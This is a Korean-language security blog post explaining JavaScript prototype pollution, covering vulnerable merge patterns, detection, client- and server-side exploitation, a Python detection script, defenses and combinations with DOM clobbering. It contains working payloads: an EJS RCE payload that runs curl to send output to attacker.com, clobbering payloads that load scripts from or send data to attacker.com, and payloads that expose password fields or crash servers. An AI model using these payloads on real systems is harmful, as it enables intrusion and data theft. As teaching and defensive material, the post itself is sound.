---
layout: post
title: Prototype Pollution
subtitle: Prototype Pollution 정리
author: g3rm
categories:
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
sidebar: Prototype
---

 # Prototype Pollution

## JavaScript의 상속 구조를 공격하는 인젝션

Apr 28, 2026
 About 11 mins

#PrototypePollution #JavaScript #NodeJS #DOMClobbering #RCE #ClientSide

---

## Intro

Prototype Pollution은 처음 공부할 때 개념이 헷갈렸던 취약점입니다. SQL Injection처럼 명확한 페이로드가 있는 게 아니라, **JavaScript의 상속 메커니즘 자체를 깨버리는** 거라 발현 지점도 다양하고 임팩트도 케이스마다 천차만별입니다.

`{}.__proto__.isAdmin = true` 한 줄만 들어가도 그 페이지의 모든 객체가 `obj.isAdmin === true`로 응답하는 마법이 펼쳐집니다. 처음엔 "이게 진짜 취약점인가?" 싶었는데, 실제로 클라이언트 측에선 XSS로, 서버 측에선 RCE까지 이어지는 케이스를 보면서 임팩트를 체감했습니다.

요즘은 Lodash, jQuery, Express 등 메이저 라이브러리들이 대부분 패치됐지만, **자체 구현된 deep merge / parser** 코드에선 여전히 발견되는 것 같습니다. 특히 사용자 입력을 객체로 변환하는 모든 지점은 한번 의심해볼 만합니다.

이 글에서는 Prototype Pollution의 원리, 발견 패턴, 클라이언트/서버 익스플로잇, 그리고 DOM Clobbering과 결합한 RCE 시나리오까지 정리해두려고 합니다.

## Prototype Pollution 이해

### Prototype 동작 원리

JavaScript는 모든 객체가 `__proto__` 체인을 통해 `Object.prototype`을 상속받습니다.

```javascript
const obj = {};
console.log(obj.__proto__ === Object.prototype);   // true
console.log(obj.toString);                          // function (Object.prototype에서 상속)

// Object.prototype에 속성을 추가하면 모든 객체가 영향받음
Object.prototype.polluted = "g3rm";
console.log({}.polluted);          // "g3rm"
console.log([].polluted);          // "g3rm"
console.log("string".polluted);    // "g3rm"
```

> 🔥 핵심은 **모든 객체가 `Object.prototype`을 공유**한다는 점입니다. 사용자 입력으로 `__proto__`에 속성을 추가할 수 있으면 애플리케이션 전체가 오염됩니다.

### 취약 패턴

```javascript
// 패턴 1: Recursive Merge (가장 흔함)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// 페이로드: {"__proto__": {"polluted": "yes"}}
// → target.__proto__.polluted = "yes" 가 되면서 Object.prototype 오염
```

```javascript
// 패턴 2: Path-based Property Set
function setValue(obj, path, value) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
        if (!current[keys[i]]) current[keys[i]] = {};
        current = current[keys[i]];
    }
    current[keys[keys.length - 1]] = value;
}

// 페이로드: setValue({}, "__proto__.polluted", "yes")
```

```javascript
// 패턴 3: Object.assign으로 사용자 입력 직접 병합
const config = Object.assign({}, defaultConfig, JSON.parse(req.body));
// req.body = '{"__proto__": {"isAdmin": true}}'
```

### Source & Sink

```
# Source (오염 가능 입력 지점)
- JSON.parse(req.body)
- URL query string parser (querystring, qs)
- Form data parser
- YAML parser
- MongoDB 쿼리 (NoSQLi 결합)

# Sink (오염된 prototype이 트리거되는 지점)
- 템플릿 엔진 (Pug, Handlebars, EJS)
- Express의 res.render
- child_process 옵션 (서버 RCE)
- innerHTML / script.src (클라이언트 XSS)
- Object 옵션 lookup ({...defaults, ...userInput})
```

## Detect & Exploit

### Detect

#### 기본 탐지 페이로드

```javascript
// 클라이언트 측 (URL 파라미터)
?__proto__[polluted]=g3rm
?__proto__.polluted=g3rm
?constructor[prototype][polluted]=g3rm

// JSON 본문
{"__proto__": {"polluted": "g3rm"}}
{"constructor": {"prototype": {"polluted": "g3rm"}}}

// 중첩
{"a": {"__proto__": {"polluted": "g3rm"}}}
```

#### 오염 확인 방법

페이로드 주입 후 응답에서 확인합니다.

```javascript
// DevTools Console에서 (클라이언트 측)
({}).polluted              // "g3rm" 이면 오염 성공

// 서버 응답에서 다음 패턴 확인
// 1. 새 응답에서 알 수 없는 필드가 등장
// 2. 기본값이 의도치 않게 변경
// 3. 특정 동작이 활성화 (디버그 모드 등)
```

#### URL 기반 자동 탐지

```bash
# 자동화 도구
ppmap https://victim.com/

# Burp Extension
# - "Backslash Powered Scanner"
# - "Server-Side Prototype Pollution Scanner" (PortSwigger)
```

> ☑️ 클라이언트 측은 DevTools에서 즉시 확인되지만, 서버 측은 부수효과(side-effect) 기반으로 추론해야 해서 **"서버 측 prototype pollution"** 진단이 훨씬 까다롭습니다. PortSwigger Research의 [SSPP scanner](https://portswigger.net/research/server-side-prototype-pollution) 기법을 참고하면 됩니다.

### Exploit - Client-Side

클라이언트 측 Prototype Pollution은 보통 XSS로 이어집니다.

#### 1. jQuery $.extend 통한 오염 → XSS

```javascript
// 취약 코드 (jQuery < 3.4.0)
$.extend(true, {}, JSON.parse(decodeURIComponent(location.hash.substring(1))));

// 페이로드 URL
https://victim.com/#%7B%22__proto__%22%3A%7B%22src%22%3A%22data%3Atext%2Fjavascript%2Calert(1)%22%7D%7D

// 디코딩 후
{"__proto__":{"src":"data:text/javascript,alert(1)"}}

// 페이지 어딘가에서 새 script 요소 생성 시
const s = document.createElement('script');
// s.src 가 빈 문자열이 아닌 prototype의 'src'를 참조 → XSS
```

#### 2. Lodash 통한 오염

```javascript
// 취약 코드 (lodash < 4.17.11)
_.merge({}, JSON.parse(req.body));
_.set(obj, userPath, value);
_.zipObjectDeep(userKeys, userValues);

// 페이로드
{"__proto__": {"polluted": "yes"}}
_.set({}, "__proto__.polluted", "yes")
_.zipObjectDeep(["__proto__.polluted"], ["yes"])
```

#### 3. 옵션 객체 가젯 (Gadget)

라이브러리들이 옵션 lookup 시 `{...defaults, ...userOptions}` 패턴을 쓰면, 오염된 prototype의 속성이 옵션으로 활용됩니다.

```javascript
// 페이지에 jQuery + 사용자 입력 처리 코드
$.parseHTML(userInput);

// 1단계: Prototype Pollution
Object.prototype.context = "<img src=x onerror=alert(1)>";

// 2단계: $.parseHTML이 옵션으로 'context'를 참조하면서 XSS 트리거
```

> 🔥 클라이언트 측 익스플로잇의 핵심은 **"Pollution + 적절한 Gadget 라이브러리"** 조합입니다. [PortSwigger의 client-side gadget 카탈로그](https://github.com/BlackFan/client-side-prototype-pollution)에 라이브러리별 가젯이 정리되어 있습니다.

### Exploit - Server-Side

서버 측은 임팩트가 훨씬 큽니다. RCE까지 이어지는 케이스가 많습니다.

#### 1. Express + EJS RCE

```javascript
// 취약 코드 (Express + EJS)
app.post('/profile', (req, res) => {
    const data = {};
    merge(data, req.body);
    res.render('profile', data);
});

// 페이로드
POST /profile
Content-Type: application/json

{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl http://attacker.com/?d=$(id)');//"
    }
}
```

EJS는 템플릿 컴파일 시 `outputFunctionName` 옵션을 그대로 코드에 삽입하기 때문에, prototype을 통해 옵션을 오염시키면 임의 코드 실행이 가능합니다.

#### 2. child_process 옵션 오염

```javascript
// 취약 코드
const { spawn } = require('child_process');
spawn('node', ['script.js']);

// 페이로드 (다른 엔드포인트에서 prototype 오염 후)
{"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}}

// → spawn 호출 시 shell, env 옵션이 prototype에서 자동 lookup
// → /bin/bash로 실행되거나 디버그 포트 노출
```

#### 3. Mongoose / Express 내부 옵션 오염

```javascript
// JSON 파서 옵션 오염
{"__proto__": {"json spaces": 999999}}     // DoS

// CORS 우회
{"__proto__": {"origin": "*", "credentials": true}}

// Mongoose populate 옵션 오염
{"__proto__": {"select": "+password +secret"}}
// → 이후 모든 query에서 비밀번호 필드까지 자동 select
```

> ☑️ Server-Side Prototype Pollution은 [Gareth Heyes의 SSPP 연구](https://portswigger.net/research/server-side-prototype-pollution)에서 Detection 기법(`status code oracle`, `JSON spaces` 등)을 제시했습니다. 진단 시 이 기법으로 1차 확인 후 가젯 매칭하는 게 정석입니다.

#### 4. 의존성 라이브러리 가젯 활용

서버에서 실행 중인 라이브러리에 따라 페이로드가 달라집니다.

```javascript
// Node.js의 require() 캐시 오염
{"__proto__": {"NODE_PATH": "/tmp/attacker_modules"}}

// pug 템플릿 엔진 RCE
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}

// Handlebars RCE
{"__proto__": {"type": "Program", "body": [...]}}
```

[Server-Side Prototype Pollution Gadgets](https://github.com/yeswehack/pp-finder) 저장소에 라이브러리별 가젯이 잘 정리되어 있습니다.

## DoS - 가장 쉬운 공격

코드 실행이 어려운 환경에서도 DoS는 거의 항상 가능합니다.

```javascript
// toString 오염 → 모든 String 변환 시 에러
{"__proto__": {"toString": null}}

// JSON.stringify 무한 루프
{"__proto__": {"length": 1e10}}

// Express 응답 처리 깨뜨리기
{"__proto__": {"_dumpExceptions": true}}
```

> 🔥 DoS는 PoC 보고용으로 가장 빠르게 임팩트를 보여줄 수 있어서, 진단 보고서에서 "최소 DoS 가능 + 추가 조사 시 RCE 가능성" 형태로 권고하는 경우가 많습니다.

## PoC - Pollution Tester

서버 응답에 `__proto__` 페이로드가 반영되는지 자동 확인하는 스크립트입니다.

```python
# Python 3.11 / requests 2.31.0
# pip install requests==2.31.0
import requests
import logging
import json
from urllib.parse import urlencode

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

# 다양한 페이로드 변형
PAYLOADS = {
    'json_proto':       {'__proto__': {'g3rm_polluted': 'YES'}},
    'json_constructor': {'constructor': {'prototype': {'g3rm_polluted': 'YES'}}},
    'json_nested':      {'a': {'__proto__': {'g3rm_polluted': 'YES'}}},
}

URL_PAYLOADS = [
    '__proto__[g3rm_polluted]=YES',
    '__proto__.g3rm_polluted=YES',
    'constructor[prototype][g3rm_polluted]=YES',
]

# Server-Side Prototype Pollution 탐지용 사이드 이펙트 페이로드
# (Heyes의 status code oracle 기법)
SIDE_EFFECT_PAYLOADS = {
    'status_oracle': {'__proto__': {'status': 510}},        # 응답 코드 변경 시 오염 확인
    'json_spaces':   {'__proto__': {'json spaces': 8}},     # JSON 응답 들여쓰기 변경 시
    'expose':        {'__proto__': {'exposedHeaders': ['X-G3rm']}},
}


def test_json_payload(target_url, payload_name, payload):
    """JSON 본문 페이로드 테스트"""
    try:
        r = requests.post(
            target_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10,
            allow_redirects=False
        )
        # 1차 확인: 같은 엔드포인트 또는 다른 엔드포인트에서 오염 확인
        check = requests.get(target_url, timeout=10)
        
        if 'g3rm_polluted' in check.text:
            logging.warning(f"[VULN] {payload_name}: Pollution reflected in response")
            return True
        
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERR] {payload_name}: {e}")
        return False


def test_url_payload(target_url, payload):
    """URL query string 페이로드 테스트"""
    try:
        url = f"{target_url}?{payload}"
        r = requests.get(url, timeout=10)
        if 'g3rm_polluted' in r.text:
            logging.warning(f"[VULN] URL payload reflected: {payload}")
            return True
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERR] {e}")
        return False


def test_side_effects(target_url):
    """사이드 이펙트 기반 SSPP 탐지 (status code oracle)"""
    logging.info("[*] Testing side-effect based detection (SSPP oracle)")
    
    # baseline 응답
    base = requests.get(target_url, timeout=10)
    base_status = base.status_code
    base_len = len(base.text)
    logging.info(f"    Baseline: status={base_status} len={base_len}")
    
    for name, payload in SIDE_EFFECT_PAYLOADS.items():
        try:
            requests.post(target_url, json=payload, timeout=10)
            check = requests.get(target_url, timeout=10)
            
            if check.status_code != base_status:
                logging.warning(f"[ORACLE] {name}: status changed {base_status} → {check.status_code}")
            elif abs(len(check.text) - base_len) > 50:
                logging.warning(f"[ORACLE] {name}: length changed {base_len} → {len(check.text)}")
        except requests.exceptions.RequestException as e:
            logging.error(f"[ERR] {name}: {e}")


def run(target_url):
    """전체 진단 실행"""
    logging.info(f"[+] Prototype Pollution Tester started")
    logging.info(f"[+] Target: {target_url}")
    
    total = len(PAYLOADS) + len(URL_PAYLOADS)
    done = 0
    hits = 0
    
    # 1. JSON 페이로드 테스트
    logging.info("[*] Phase 1: JSON Body Pollution")
    for name, payload in PAYLOADS.items():
        done += 1
        logging.info(f"[Progress] {done}/{total} - {name}")
        if test_json_payload(target_url, name, payload):
            hits += 1
    
    # 2. URL 페이로드 테스트
    logging.info("[*] Phase 2: URL Query Pollution")
    for payload in URL_PAYLOADS:
        done += 1
        logging.info(f"[Progress] {done}/{total} - {payload[:30]}")
        if test_url_payload(target_url, payload):
            hits += 1
    
    # 3. 사이드 이펙트 기반 SSPP
    test_side_effects(target_url)
    
    logging.info(f"[+] Done. Hits: {hits}/{total}")


if __name__ == '__main__':
    # RoE 범위 내 진단 환경에서만 사용
    run('https://victim.example.com/api/profile')
```

## Security Measures

### 1. `Object.create(null)` 사용

```javascript
// 위험 (Object.prototype 상속)
const config = {};

// 안전 (prototype 체인 없음)
const config = Object.create(null);
config.__proto__ = "test";        // prototype 오염 시도해도 영향 없음
console.log(config.toString);      // undefined
```

### 2. `Object.freeze(Object.prototype)`

```javascript
// 애플리케이션 시작 시 한번 호출
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);

// 이후 prototype 오염 시도는 silently fail (strict mode에선 throw)
```

### 3. JSON 파싱 시 `__proto__` 키 차단

```javascript
// reviver 함수로 위험 키 제거
JSON.parse(input, (key, value) => {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        return undefined;
    }
    return value;
});
```

### 4. Map / Set 사용

```javascript
// 위험 (객체 사용)
const cache = {};
cache[userKey] = value;

// 안전 (Map은 prototype 체인 영향 없음)
const cache = new Map();
cache.set(userKey, value);
```

### 5. 검증된 라이브러리 사용

직접 deep merge 구현하지 말고 검증된 것 사용하면 됩니다.

- **lodash >= 4.17.21** (구버전은 취약)
- **deepmerge** (npm)
- **immer** (불변성 + 안전)

### 6. Node.js 옵션 활용

```bash
# Node.js 실행 시 prototype 오염 차단
node --disable-proto=delete app.js
node --disable-proto=throw app.js
```

> ☑️ `--disable-proto` 옵션은 Node.js 12.0 이상에서 사용 가능하고, **`__proto__` 접근 자체를 차단**해서 가장 강력한 방어가 됩니다.

---

## 🔗 별첨: Prototype Pollution + DOM Clobbering 결합 시나리오

두 기법은 단독으론 임팩트가 제한적이지만, **결합하면 sanitizer 적용 환경에서도 RCE급 임팩트**가 나오는 경우가 있습니다. 진단 시 두 기법을 따로따로 보지 말고 같이 봐야 하는 이유입니다.

### 결합이 필요한 이유

```
[단독 한계]
- Prototype Pollution: JSON 파서가 __proto__ 키를 차단하면 막힘
- DOM Clobbering: 깊은 중첩 객체나 함수 호출 결과까지는 영향 못 줌

[결합 시 시너지]
- DOM Clobbering으로 prototype 체인의 중간 객체를 점령
- 점령한 객체의 속성을 통해 라이브러리 옵션 lookup 가젯 트리거
- → JS 한 줄 실행 없이 sanitizer 통과 → 외부 script 로드 → RCE
```

### Scenario 1. Sanitized HTML에서 jQuery Pollution 트리거

`<script>` 태그가 막혀있고 JSON 파싱도 안전한데, 페이지에 jQuery가 있고 사용자 HTML이 렌더링되는 환경입니다.

```javascript
// 페이지 코드 (취약 - jQuery < 3.4.0)
$(document).ready(function() {
    const opts = $.extend(true, {}, defaults, getUserConfig());
    $.parseHTML(opts.html, opts.context);
});

function getUserConfig() {
    // 사용자가 만든 페이지의 form 데이터를 객체로 변환
    const form = document.getElementById('config');
    if (!form) return {};
    return Object.fromEntries(new FormData(form));
}
```

```html
<!-- 페이로드: HTML만 삽입 (Sanitizer 통과) -->
<form id="config">
    <input name="__proto__[context]" value="...">
    <input name="html" value="&lt;img src=x onerror=alert(1)&gt;">
</form>
```

```
[동작 흐름]
1. DOM Clobbering: form#config → window.config = <form>
2. FormData 추출 시 __proto__[context] 키가 그대로 객체 키로 변환
3. $.extend(true, ...) 가 deep merge 하면서 prototype 오염
4. $.parseHTML이 prototype의 context 속성을 참조하면서 XSS 트리거
```

### Scenario 2. Object.prototype 직접 오염은 불가, 중간 객체 가로채기

DOM Clobbering으론 `Object.prototype` 자체는 못 건드리지만, **prototype 체인을 따라 lookup하는 중간 객체**를 점령할 수 있습니다.

```javascript
// 취약 코드 (라이브러리 옵션 lookup 패턴)
function getOption(name) {
    return window.appConfig?.[name] ?? defaults[name];
}

// 어디선가 사용
const url = getOption('apiURL');
fetch(url);
```

```html
<!-- 페이로드 -->
<form id="appConfig">
    <input name="apiURL" value="https://attacker.com/log">
</form>

<!-- 동작 흐름
1. window.appConfig = <form>
2. appConfig.apiURL = <input>
3. fetch(<input>) → input.toString() → input.value = URL
4. 공격자 서버로 데이터 유출
-->
```

### Scenario 3. Mocha/Lodash 가젯 + Form Clobbering으로 자동 트리거

가장 임팩트 있는 결합입니다. 페이지 로드 시 자동 실행되는 라이브러리 초기화 루틴에서 가젯이 발동합니다.

```javascript
// 취약 코드 (페이지에 Mocha가 있는 경우 - 일부 테스트 페이지에서 발견)
mocha.setup({ /* options */ });

// Mocha는 옵션 lookup 시 prototype 체인까지 탐색
// → Object.prototype에 'reporter' 속성이 있으면 그걸 사용
```

```html
<!-- 페이로드 (DOMPurify 통과) -->
<form id="constructor">
    <input name="prototype">
</form>

<!-- 또는 더 직접적으로 (Mocha의 src 옵션 가젯) -->
<a id="reporter" href="//attacker.com/x.js"></a>
<form id="src">
    <input name="value" value="//attacker.com/x.js">
</form>
```

> 🔥 [BlackFan의 client-side prototype pollution](https://github.com/BlackFan/client-side-prototype-pollution) 저장소에 **라이브러리별 가젯**과 **Clobbering 결합 페이로드**가 한 묶음으로 정리되어 있습니다. 진단 시 페이지에서 라이브러리 식별 후 매칭되는 페이로드 가져오는 게 가장 빠릅니다.

### Scenario 4. Prototype 오염을 통한 신규 변수 생성 → Clobbering Sink 활성화

반대 방향 결합입니다. 원래는 `window.config`가 없어서 clobbering 못하는 환경에서, prototype 오염으로 모든 객체에 `config` 속성을 만든 뒤 활용합니다.

```javascript
// 취약 코드
if (window.someConfig?.callback) {
    window.someConfig.callback();
}
```

```
[동작 흐름]
1. 다른 엔드포인트에서 Prototype Pollution
   → Object.prototype.someConfig = { callback: () => ... }
   
2. 위 코드 실행 시 window.someConfig가 prototype에서 lookup되며 활성화

3. 클로버링 페이로드로 callback 함수 자체를 가로챔
   <a id="someConfig" ...>
```

### 결합 시나리오 진단 체크리스트

```
1. 페이지에 사용된 라이브러리 식별 (jQuery, Lodash, Bootstrap, Mocha 등)
   → 알려진 가젯 매칭

2. Sanitizer 적용 여부 확인 + 우회 가능성
   → DOMPurify의 SANITIZE_NAMED_PROPS 옵션 미적용 시 Clobbering 가능

3. JSON 파서 안전성 확인
   → __proto__ 키 차단 여부

4. 두 기법의 매칭 지점 찾기
   → "prototype 오염으로 영향받을 변수" ↔ "clobbering으로 점령 가능한 변수"
   → 겹치는 변수가 있으면 단독으론 막혀도 결합 시 가능

5. 외부 script 로드 가능 여부 확인 (CSP 검증)
   → 가젯 발동 후 attacker.com에서 JS 로드 가능해야 RCE까지 연결
```

### 결합 방어

단일 방어로는 부족하고 **다층 방어**가 필요합니다.

```javascript
// 1. Prototype Pollution 차단
Object.freeze(Object.prototype);

// 2. DOM Clobbering 차단
DOMPurify.sanitize(input, { SANITIZE_NAMED_PROPS: true });

// 3. CSP로 외부 script 로드 차단 (마지막 방어선)
// Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; base-uri 'none'

// 4. typeof 검증으로 옵션 lookup 시 객체 검증
if (typeof window.appConfig === 'object' && 
    !(window.appConfig instanceof HTMLElement) &&
    Object.getPrototypeOf(window.appConfig) === Object.prototype) {
    // 안전한 사용
}
```

> ☑️ 4번의 prototype 검증까지 들어가면 거의 완벽하지만 코드가 장황해지므로, 보통 1+2+3 조합으로 권고합니다.

## References

- [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger - Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [HackTricks - Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [BlackFan - Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [yeswehack - PP-Finder Gadgets](https://github.com/yeswehack/pp-finder)
- [OWASP - Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [Snyk - PP Research](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)



 










